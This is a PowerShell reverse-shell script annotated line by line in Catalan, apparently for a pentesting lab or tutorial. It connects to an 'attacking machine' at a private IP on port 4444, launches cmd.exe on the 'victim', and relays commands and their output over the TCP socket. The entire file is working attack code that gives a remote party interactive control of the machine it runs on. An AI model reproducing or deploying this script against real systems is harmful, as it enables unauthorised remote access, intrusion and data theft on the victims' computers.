$direccio = '192.168.1.42' #Direcció IP de la màquina atacant
$port = '4444' #Port on ha de connectar-se
$connexio = New-Object System.Net.Sockets.TcpClient #Establiment del mètode de connexió: TCP/IP
$connexio.Connect($direccio,$port) #Indicar a quina direcció IP i a quin port s'ha de connectar
$flux = $connexio.GetStream() #Variable per obrir un flux de dades d'entrada i sortida entre les dues màquines
$buffer = New-Object System.Byte[] $connexio.ReceiveBufferSize #Buffer per a mantenir una connexió més estable
####################################################################
#Definició del procés de connexió entre màquines
$proces = New-Object System.Diagnostics.Process #Definició de variables per a crear el procés de comunicació amb la màquina atacant
$proces.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe' #Execució dels comandaments desde la màquina atacant al símbol del sistema (CMD) de la màquina víctima
$proces.StartInfo.RedirectStandardInput = 1 #Lector d'entrades de dades
$proces.StartInfo.RedirectStandardOutput = 1 #Lector de sortides de dades
$proces.StartInfo.UseShellExecute = 0 #Enlloc d'utilitzar el shell de comandaments per executar els comandaments, ho fara el script (la reverse-shell)
$proces.Start() #Començament del procés
###################################################################
$entradaflux = $proces.StandardInput #Enviament de dades cap al procés de connexió
$sortidaflux = $proces.StandardOutput #Rebuda de dades del procés de connexió
Start-Sleep 1 #Aturada d'1 segon per a processar el codi
$codificacio = New-Object System.Text.ASCIIEncoding #Codificació per passar de text a llenguatge binari (base 2) i viceversa (en ASCII (base 10))
###################################################################
#Funció per fer neteja del codi i reiniciar el programa en cas que sigui necessari
function cleanup {
    if ($connexio.Connected -eq $true) {
        $connexio.Close()
    }
    if ($proces.ExitCode -ne $null) {
        $proces.Close()
    }
    exit
}
###################################################################
#Bucle per llegir i capturar la sortida del procés de connexió
while ($sortidaflux.Peek() -ne -1) {
    $sortida += $codificacio.GetString($sortidaflux.Read())
}
####################################################################
$flux.Write($codificacio.GetBytes($sortida),0,$sortida.Length) #Enviament de les dades de sortida a la màquina atacant
$sortida = $null #Neteja de les dades de sortida perquè no s'acumulin
$acabat = $false #Variable per mantenir el bucle while en funcionament
####################################################################
while (-not $acabat) { #Si la connexió no està establerta, s'executarà la funció cleanup per evitar acumulació de dades o processos
    if ($connexio.Connected -ne $true) {
        cleanup
    }
    $posicio = 0 #Indicador de la posició actual en la que s'han d'emmagatzemar les dades del buffer
    $i = 1 #Contador per a mantenir el bucle
    while (($i -gt 0) -and ($posicio -lt $buffer.length)) { #Si la variable $i és major a 0 i $posicio és menor a la longitud del buffer, el bucle s'executarà
        $lectura = $flux.Read($buffer,$posicio,$buffer.Length - $posicio) #Lectura de les dades d'entrada i emmagatzematge en el buffer
        $posicio+=$lectura #La variable $posicio s'actualitza després de la lectura per evitar sobreescriptures de dades
        if ($posicio -and ($buffer[0..$($posicio-1)] -contains 10)) { #Recopilació de les dades llegides i emmagatzemades en el buffer per separar les dades llegides de les no llegides
            break #Si aquesta recopilació conté el valor 10 (que és el caràcter del codi ASCII per saltar de línea) aleshores salta de línea i aleshores atura el bucle while anterior
        }
    }
    if ($posicio -gt 0) { #Si $posició és major que 0 (ha llegit com a mínim un byte de dades) el bucle s'executa
        $string = $codificacio.GetString($buffer,0,$posicio) #Conversió de les dades emmagatzemades en el buffer --> text (desde l'inici)
        $entradaflux.Write($string) #Enviament del text a l'entrada del flux de la màquina atacant
        start-sleep 1
        if ($proces.ExitCode -ne $null) { #Si el codi de sortida del procés de connexió ha finalitzat amb un resultat no nul, s'executa la funció cleanup
            cleanup
        }
        else {
            $sortida = $codificacio.GetString($sortidaflux.Read()) #Llegeix de les dades del flux de sortida i els converteix en text utilitzant $codificacio
            while ($sortidaflux.Peek() -ne -1) { #Lectura i concatenació de dades del flux de sortida
                $sortida += $codificacio.GetString($sortidaflux.Read()) 
                if ($sortida -eq $string) { #Es comparen les variables $sortida i $string per veure si hi ha línies de text duplicades i restableix $sortida en el cas que hi siguin.
                    $sortida = ''
                }
            }
            $flux.Write($codificacio.GetBytes($sortida),0,$sortida.Length) #Escriu les dades a dins de $sortida en el flux d'entrada de la màquina atacant, dades com ara comandaments o missatges d'error
            $sortida = $null #Reinicialització de $sortida i $string per a evitar acumulació de dades i tenir les variables enllestides per una nova iteració dels bucles
            $string = $null
        }
    }
}